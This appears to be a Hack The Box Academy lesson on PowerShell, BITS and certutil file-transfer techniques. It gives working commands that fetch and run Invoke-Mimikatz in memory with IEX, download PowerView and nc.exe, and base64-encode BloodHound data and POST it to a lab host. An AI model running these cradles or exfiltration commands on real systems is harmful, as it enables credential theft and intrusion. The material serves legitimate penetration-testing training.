# PowerShell Downloads

## System.Net.WebClient
In most environments, HTTP/HTTPS traffic is allowed out of the firewall in some form - and if we have a GUI session, a web browser could also be used. However, from a Windows shell, PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP.

```powershell
PS C:\htb> (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
```

From PowerShell 3.0, Invoke-WebRequest is also available, but it is noticeably slower at downloading files. The aliases iwr, curl, and wget can be used instead of Invoke-WebRequest.

```powershell  
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias iex.

```powershell 
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX also accepts pipeline input.
```powershell  
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
```
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
![Picture_of_IEengine](https://academy.hackthebox.com/storage/modules/24/IEerror.png)
![Picture_of_IE](https://academy.hackthebox.com/storage/modules/24/IE_settings.png)

This can be bypassed using the parameter -UseBasicParsing.

```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
PS C:\htb> Invoke-CheckLocalAdminAccess

ComputerName IsAdmin
------------ -------
localhost      False
```

Alternatively, with administrative access to the machine, we can disable Internet Explorer’s First Run customization.

```powershell 
C:\htb> reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```
Powershell download cradles that do not observe Internet Explorer’s first-run check can also be used. Harmj0y has compiled an extensive list of PowerShell download cradles here. It is worth gaining familiarity with them and their individual nuances, such as not observing a proxy or touching a disk to select the appropriate one for the situation.

## PowerShell File Uploads

It is also possible to upload files using Powershell using Invoke-WebRequest or Invoke-RestMethod.

```powershell  
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
```
```powershell
PS C:\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```
After catching the base64 data with Netcat, the payload can be decoded.

```powershell  
Ryohei@htb[/htb]$ echo <base64> | base64 -d -w 0 > bloodhound.zip
```

## Bitsadmin
The Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user’s foreground work.

````powershell  
PS C:\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
````
PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

## Download
````powershell
PS C:\htb> Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
````
## Upload
````powershell
PS C:\htb> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
````

## Certutil
Casey Smith (@subTee) found that certutil can be used to download arbitrary files. It is available in all Windows versions and has been a very popular file transfer technique, essentially serving as Wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious certutil usage.
```powershell
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```
